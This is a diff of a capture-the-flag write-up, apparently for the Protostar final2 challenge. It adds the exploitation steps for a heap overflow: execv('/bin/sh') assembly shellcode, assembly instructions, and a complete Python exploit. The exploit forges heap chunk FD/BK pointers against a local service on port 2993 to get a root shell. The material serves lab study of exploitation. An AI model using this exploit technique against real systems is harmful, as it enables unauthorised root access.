@@ -583,4 +583,93 @@ s.send(ck2)
 ```
 ![image4](https://github.com/YazoSh/ctf-writeups/raw/master/images/final2-4.png)
 
-all we have to do now is to throw in some shellcode to execute /bin/sh and give us a root shell! 
+all we have to do now is to create a shellcode to execute excev and give /bin/sh\x00 as its first argument
+
+we could but the shell path somewhere in the first chunk
+
+just make sure its before the first '/' before "ROOT" and that it's after the first 16 bytes in the chunk since they will get overridden when the first chunk is freed
+with the FD and BK pointers
+
+```assembly
+section .text
+push 0 ;3rd argument
+push 0 ;2nd argument
+push 0x0804e010 ;1st argument (/bin/sh address we put at chunk1)
+mov eax, 0x08048f6c ;load execv's address into eax
+call eax ;call execv
+```
+use nasm on your hostmachine an assemble with
+> nasm -f elf32 shellcode.as
+
+then view the file with objdump
+> objdump -d shellcode.o
+
+```
+shellcode.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:   6a 00                   push   $0x0
+   2:   6a 00                   push   $0x0
+   4:   68 10 e0 04 08          push   $0x804e010
+   9:   b8 6c 8f 04 08          mov    $0x8048f6c,%eax
+   e:   ff d0                   call   *%eax
+```
+our shellcode is "\x6a\x00\x6a\x00\x68\x10\xe0\x04\x08\xb8\x6c\x8f\x04\x08\xff\xd0"
+
+now that everything is ready send a 1 byte string to break out of the loop
+
+all you have to now is to setup a simple interactive shell to send and recive data
+
+a simple 
+```python
+while(True):
+        c = os.read(0, 100)
+        s.send(c)
+        print s.recv(100)
+```
+will do just fine
+
+```python
+import socket
+import struct
+import os
+
+s = socket.socket(socket.AF_INET)
+s.connect(('127.1', 2993))
+
+# first chunk
+ck1 = "FSRD0000/bin/sh\x00/0000ROOT/1111"
+ck1 += "/" * (128 - (len(ck1)))
+s.send(ck1)
+
+# second chunk
+ck2 = "FSRDROOT/"
+ck2 += struct.pack('I', 0xfffffffc)
+ck2 += struct.pack('I', 0xfffffffc)
+#FD and BK
+ck2 += struct.pack('I', 0x0804d41c - 12)
+ck2 += struct.pack('I', 0x0804e098)
+#shellcode
+ck2 += "\xeb\x0a"
+ck2 += '\x90' * 20
+ck2 += "\x6a\x00\x6a\x00\x68\x10\xe0\x04\x08\xb8\x6c\x8f\x04\x08\xff\xd0"
+
+ck2 += "A" * (128 - (len(ck2)))
+s.send(ck2)
+
+# to break out of the while loop
+s.send("A")
+
+while(True):
+        c = os.read(0, 999)
+        s.send(c)
+        print s.recv(999)
+```
+![image5](https://github.com/YazoSh/ctf-writeups/raw/master/images/final2-5.png)
+
+Here is our root shell
+
+wasn't that hard was it?
